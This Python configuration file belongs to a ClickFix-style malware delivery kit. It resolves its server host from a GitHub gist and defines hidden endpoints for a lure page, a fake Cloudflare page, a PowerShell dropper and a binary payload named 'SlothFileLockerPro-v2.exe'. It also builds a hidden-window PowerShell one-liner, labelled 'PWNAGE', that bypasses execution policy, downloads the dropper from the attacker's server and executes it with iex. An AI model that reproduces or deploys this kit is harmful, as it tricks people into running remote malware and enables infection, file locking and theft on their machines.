import os
import requests
import uuid



#Main Condition
isDeployed = os.environ.get("IS_DEPLOYED","NOPE") == "YEP"

#Static Mere Configs
ServerFile = "server.py"
slash = "/" if isDeployed else "\\"
_0_X_ST_URL = "https://gist.githubusercontent.com/loginrevoked-eng/9cde23712df12309d79e0e6af2f1a968/raw" 
_0_X_ST_URL_2 = "https://gist.githubusercontent.com/loginrevoked-eng/9cde23712df12309d79e0e6af2f1a968/raw/6a4a7a952ed765bb30b9d6c35c1b051d75c18d7f/PicZ.txt"



#lambda getters for host and favicon =>)
getDeployedHost = lambda _0_X_0_ST_url=None:requests.get(_0_X_0_ST_url).text.splitlines()[0].strip().split("=")[1]
getFaviconURL = lambda _0_X_0_ST_url="NONE":requests.get(_0_X_0_ST_url).text.splitlines()[1].split("=")[1].strip()
gtHostFailed = lambda _0_X_0_ST_url="NONE",error=None:print(f"Failed to get deployed host from {_0_X_0_ST_url} because of {error}")
gtHost = lambda _0_X_0_ST_url="NONE",scope=None:(exec(f"try: scope['host'] = getDeployedHost(_0_X_0_ST_url='{_0_X_0_ST_url}') \nexcept Exception as e:gtHostFailed(_0_X_0_ST_url='{_0_X_0_ST_url}',error=e)"),scope.get("host","localhost"))[1]
getFullDomain = lambda host:f'https://{host}' if isDeployed else f'http://{host}:80'


#URI Building (PORT and HOST) mere shit
DeployedPort = os.environ["PORT"] if isDeployed else "80"
host = "localhost" if not isDeployed else gtHost(_0_X_ST_URL,{"host":"localhost"})


#Endpoints and FILEPATHS
payloadPathOnUserMachine = "C:\\\\MicrosoftSmartBoot"
mainInterfaceEndpoint = "/"
hookPageEndpoint = "/45f95d55-8681-46b0-8afa-6d87b02e01dc"
binName = "SlothFileLockerPro-v2.exe"
binEndpoint = "/3a949fd7-ddfb-43f2-94cd-fb4ecda8ed7a"
dropperEndpoint = "/9ecf27ab-c302-4c78-8dd8-62576f46e13a"
dropperName = "test.ps1"
payloadFolder = f".{slash}bin{slash}" 
staticFolder = f".{slash}static{slash}"

def changeEndpoints():
    #must call this() before starting the server
    globals()["hookPageEndpoint"] = "/" + str(uuid.uuid4())
    globals()["binEndpoint"] = "/" + str(uuid.uuid4())
    globals()["dropperEndpoint"] = "/" + str(uuid.uuid4())

def addPowershellIWR(config: dict):
    cmd = (
        f'powershell -NoWindow -ExecutionPolicy Bypass -c '
        f'"mkdir \'{payloadPathOnUserMachine}\'; cd \'{payloadPathOnUserMachine}\'; '
        f'$s = (iwr {config["URLS"]["POWERSHELL_DROPPER_URL"]} -UseBasicParsing).Content | iex"'
    )
    config["OTHER"]["COMMANDS"]["POWERSHELL ONELINER PWNAGE"] = cmd
    
#CONVININCE WRAPPERs
conf = {
    "IS_DEPLOYED":isDeployed,
    "HOST":host,
    "PORT":DeployedPort,
    "ENV_VARS":", ".join(f"{x}={y}" if x in globals() else "" for x,y in os.environ.items()),
    "URLS":{
        "POWERSHELL_DROPPER_URL":f"{getFullDomain(host)}{dropperEndpoint}",
        "ACTUAL_BINARY_PAYLOAD":f"{getFullDomain(host)}{binEndpoint}",
        "CLICKFIX_PAGE_ENDPOINT":f"{getFullDomain(host)}{hookPageEndpoint}",
        "FAVICON_URL":getFaviconURL(_0_X_ST_URL)
    },
    "PATHS":{
        "CLOUDFLARE_PAGE":f"{staticFolder}cloudflare.html",
        "CLICKFIX_PAGE":f"{staticFolder}clickfix.html",
        "POWERSHELL_DROPPER":f"{payloadFolder}{dropperName}",
        "BINARY_PAYLOAD":f"{payloadFolder}{binName}"
    },
    "USER_SIDE":{
        "PATHS":{
            "FINAL_EXE_PAYLOAD_PATH":payloadPathOnUserMachine,
        }
    },
    "OTHER":{
        "COMMANDS":{
            "POWERSHELL ONELINER PWNAGE":""
        }
    },
    "SERVER_CORS":{
        "AllowedMethods":["*"],
        "AllowedHeaders":["*"],
        "AllowedDomains":["*"]
    }
}
addPowershellIWR(conf)

#(lambda:print(globals()))()